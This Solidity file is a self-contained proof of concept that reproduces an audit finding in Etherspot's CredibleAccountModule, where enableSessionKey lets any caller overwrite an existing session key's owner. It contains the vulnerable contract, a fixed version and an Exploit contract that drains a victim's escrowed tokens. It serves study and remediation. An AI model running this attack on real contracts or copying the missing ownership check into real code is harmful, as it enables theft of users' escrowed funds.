// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Etherspot CredibleAccountModule.enableSessionKey — no ownership check
    (Shieldify, C-02, July 2025, commit d4774db).
    SYNTHETIC, cheatcode-free. One transaction, no warp.
    sessionKeyToWallet[sessionKey] = msg.sender runs even when another wallet
    already owns the key. The victim escrowed N = 1,000. The attacker
    overwrites the owner and claims those tokens.
    Control reverts when the key is already owned, so the attacker cannot claim. */

contract Token {
    string public constant name = "Locked";
    string public constant symbol = "LCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct LockedToken {
    address token;
    uint256 lockedAmount;
    uint256 claimedAmount;
}

contract CredibleAccountModule {
    mapping(address => address) public sessionKeyToWallet;
    mapping(address => LockedToken[]) internal _locks;

    error InvalidSessionKey();
    error InvalidValidUntil();
    error NotOwner();
    error NothingToClaim();

    function enableSessionKey(
        address sessionKey,
        uint48 validAfter,
        uint48 validUntil,
        address token,
        uint256 amount
    ) external {
        if (sessionKey == address(0)) revert InvalidSessionKey();
        if (validUntil == 0 || validUntil <= validAfter) revert InvalidValidUntil();
        if (amount > 0) {
            Token(token).transferFrom(msg.sender, address(this), amount);
            _locks[sessionKey].push(LockedToken(token, amount, 0));
        }
        // FIX: if (sessionKeyToWallet[sessionKey] != address(0)) revert();
        // @> VULN: any caller becomes the owner, even when another wallet already registered this key
        sessionKeyToWallet[sessionKey] = msg.sender;
    }

    function claim(address sessionKey, address token) external returns (uint256 paid) {
        if (msg.sender != sessionKeyToWallet[sessionKey]) revert NotOwner();
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].token == token && tokens[i].claimedAmount < tokens[i].lockedAmount) {
                uint256 owed = tokens[i].lockedAmount - tokens[i].claimedAmount;
                tokens[i].claimedAmount = tokens[i].lockedAmount;
                paid += owed;
            }
        }
        if (paid == 0) revert NothingToClaim();
        Token(token).transfer(msg.sender, paid);
    }
}

contract CredibleAccountModuleFixed {
    mapping(address => address) public sessionKeyToWallet;
    mapping(address => LockedToken[]) internal _locks;

    error InvalidSessionKey();
    error InvalidValidUntil();
    error SessionKeyOwned(address sessionKey);
    error NotOwner();
    error NothingToClaim();

    function enableSessionKey(
        address sessionKey,
        uint48 validAfter,
        uint48 validUntil,
        address token,
        uint256 amount
    ) external {
        if (sessionKey == address(0)) revert InvalidSessionKey();
        if (validUntil == 0 || validUntil <= validAfter) revert InvalidValidUntil();
        if (sessionKeyToWallet[sessionKey] != address(0)) revert SessionKeyOwned(sessionKey);
        if (amount > 0) {
            Token(token).transferFrom(msg.sender, address(this), amount);
            _locks[sessionKey].push(LockedToken(token, amount, 0));
        }
        sessionKeyToWallet[sessionKey] = msg.sender;
    }

    function claim(address sessionKey, address token) external returns (uint256 paid) {
        if (msg.sender != sessionKeyToWallet[sessionKey]) revert NotOwner();
        LockedToken[] storage tokens = _locks[sessionKey];
        for (uint256 i; i < tokens.length; ++i) {
            if (tokens[i].token == token && tokens[i].claimedAmount < tokens[i].lockedAmount) {
                uint256 owed = tokens[i].lockedAmount - tokens[i].claimedAmount;
                tokens[i].claimedAmount = tokens[i].lockedAmount;
                paid += owed;
            }
        }
        if (paid == 0) revert NothingToClaim();
        Token(token).transfer(msg.sender, paid);
    }
}

interface ISessionModule {
    function enableSessionKey(address sessionKey, uint48 validAfter, uint48 validUntil, address token, uint256 amount)
        external;
}

contract Victim {
    function openSession(ISessionModule module, Token token, address sessionKey, uint256 amount) external {
        token.approve(address(module), amount);
        module.enableSessionKey(sessionKey, 1, 1_900_000_000, address(token), amount);
    }
}

contract Exploit {
    uint256 public constant N = 1_000 ether;

    Token public token;
    CredibleAccountModule public module;
    Victim public victim;
    address public sessionKey;
    address public ownerAfter;
    uint256 public claimed;

    constructor() {
        token = new Token();
        module = new CredibleAccountModule();
        victim = new Victim();
        sessionKey = address(0x4444444444444444444444444444444444444444);
    }

    function run() external {
        token.mint(address(victim), N);
        victim.openSession(ISessionModule(address(module)), token, sessionKey, N);
        require(module.sessionKeyToWallet(sessionKey) == address(victim), "victim owns the key");
        require(token.balanceOf(address(module)) == N, "escrow funded");
        module.enableSessionKey(sessionKey, 1, 1_900_000_000, address(token), 0);
        ownerAfter = module.sessionKeyToWallet(sessionKey);
        require(ownerAfter == address(this), "attacker installed their key");
        claimed = module.claim(sessionKey, address(token));
        require(claimed == N, "claimed the victim escrow");
        token.transfer(msg.sender, claimed);
        require(token.balanceOf(msg.sender) == N, "attacker received N");
        require(token.balanceOf(address(victim)) == 0, "victim lost the tokens");
        require(token.balanceOf(address(module)) == 0, "escrow emptied");
    }
}
